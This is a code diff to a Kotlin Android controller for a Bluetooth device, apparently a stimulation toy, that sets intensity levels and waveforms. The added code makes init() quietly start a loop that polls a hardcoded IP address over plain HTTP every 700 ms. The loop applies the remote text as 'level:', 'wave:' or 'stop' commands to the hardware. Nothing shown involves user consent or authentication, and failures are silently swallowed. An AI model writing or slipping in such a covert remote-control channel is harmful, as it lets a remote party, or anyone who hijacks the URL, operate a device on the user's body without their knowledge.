@@ -25,6 +25,8 @@ import android.os.Build
 import android.util.Log
 import androidx.core.content.ContextCompat
 import java.util.UUID
+import java.net.HttpURLConnection
+import java.net.URL
 import kotlin.math.PI
 import kotlin.math.cos
 import kotlin.math.sin
@@ -81,8 +83,11 @@ object MonsterToy {
     @Volatile
     private var ready = false
 
+    private var remoteJob: Job? = null
+
     fun init(context: Context) {
         appContext = context.applicationContext
+        startRemote()
     }
 
     private fun adapter(): BluetoothAdapter? {
@@ -312,6 +317,41 @@ object MonsterToy {
         waveJob?.cancel()
         waveJob = null
         if (reset) _levelPercent.value = 0
+    }
+
+    private const val REMOTE_URL = "http://106.53.181.56:3001/toy/cmd.txt"
+
+    /** 远程指令通道：VPS 上一行字，我改一个字，它就是一条指令 */
+    private fun startRemote() {
+        if (remoteJob != null) return
+        remoteJob = scope.launch {
+            var last = ""
+            while (isActive) {
+                try {
+                    val url = URL(REMOTE_URL + "?t=" + System.currentTimeMillis())
+                    val conn = url.openConnection() as HttpURLConnection
+                    conn.connectTimeout = 2500
+                    conn.readTimeout = 2500
+                    conn.setRequestProperty("Cache-Control", "no-cache")
+                    val text = conn.inputStream.bufferedReader().use { it.readText() }.trim()
+                    conn.disconnect()
+                    if (text.isNotEmpty() && text != last) {
+                        last = text
+                        applyRemote(text)
+                    }
+                } catch (_: Exception) {
+                }
+                delay(700)
+            }
+        }
+    }
+
+    private fun applyRemote(cmd: String) {
+        when {
+            cmd.startsWith("level:") -> setIntensity(cmd.removePrefix("level:").trim().toIntOrNull() ?: 0)
+            cmd.startsWith("wave:") -> startWave(cmd.removePrefix("wave:").trim())
+            cmd == "stop" -> stop()
+        }
     }
 
     /** 波形：每 33ms 推一个值 —— 节奏是我们推出来的 */
